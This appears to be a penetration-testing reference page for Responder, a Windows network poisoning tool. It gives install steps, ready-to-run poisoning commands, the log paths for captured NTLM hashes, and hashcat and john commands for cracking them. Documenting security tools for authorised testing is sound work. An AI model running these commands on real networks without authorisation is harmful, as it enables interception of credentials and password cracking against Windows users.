---
title: "Responder"
category: "tool"
tags:
  - windows
  - active-directory
  - credential-harvesting
  - network-poisoning
  - ntlm
sources:
  - type: github
    url: "https://github.com/lgandx/Responder"
last_updated: "2025-12-27"
---

# Responder

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Key Options](#key-options)
- [Documentation Files](#documentation-files)

## Overview

Responder is an LLMNR, NBT-NS, and mDNS poisoner designed for penetration testing Windows networks. When a Windows host fails to resolve a hostname via DNS, it falls back to multicast protocols (LLMNR/NBT-NS). Responder answers these queries, redirecting traffic to the attacker and capturing NTLMv1/v2 hashes.

**Key Features:**

- Dual IPv6/IPv4 stack support
- Built-in authentication servers: SMB, HTTP(S), MSSQL, LDAP, FTP, POP3, IMAP, SMTP
- WPAD proxy server for browser credential capture
- Analyze mode for passive network reconnaissance
- Captured hashes saved in John/Hashcat-compatible format

## Installation

**Using pipx (recommended):**

```bash
pipx install git+https://github.com/lgandx/Responder.git
```

**Manual installation:**

```bash
git clone https://github.com/lgandx/Responder
cd Responder
pip install netifaces
```

**Pre-requisites:** Stop conflicting services (smbd, nmbd, dnsmasq) before running.

## Quick Start

**Capture NTLMv2 hashes on the network:**

```bash
# Basic poisoning on interface eth0
sudo responder -I eth0

# With WPAD proxy authentication (highly effective)
sudo responder -I eth0 -wPv

# Analyze mode (passive, no poisoning)
sudo responder -I eth0 -A
```

**Captured hashes location:**

- Hashes: `logs/(MODULE)-(HASH_TYPE)-(CLIENT_IP).txt`
- Session log: `logs/Responder-Session.log`
- SQLite database: configurable in `Responder.conf`

**Crack captured hashes:**

```bash
# Using hashcat (NTLMv2 = mode 5600)
hashcat -m 5600 captured_hash.txt wordlist.txt

# Using john
john --format=netntlmv2 captured_hash.txt
```

## Key Options

| Option | Description |
|--------|-------------|
| `-I <iface>` | Network interface (use `ALL` for all interfaces) |
| `-A` | Analyze mode - passive reconnaissance, no poisoning |
| `-w` | Start WPAD rogue proxy server |
| `-P` | Force NTLM auth for proxy (highly effective) |
| `-F` | Force auth on wpad.dat retrieval |
| `-b` | Return Basic HTTP auth instead of NTLM |
| `-v` | Verbose mode - log all hashes including duplicates |
| `-e <ip>` | Poison with external IP instead of Responder's |
| `-d` | Enable DHCP broadcast answers with WPAD injection |
| `--lm` | Force LM hashing downgrade (legacy systems) |
| `-Q` | Quiet mode - reduce output verbosity |

## Documentation Files

| File | Description |
|------|-------------|
| [README.md](README.md) | Tool overview and quick reference |
| [techniques.md](techniques.md) | Attack techniques, relay attacks, and OPSEC considerations |
| [official_docs.md](official_docs.md) | Full upstream documentation |
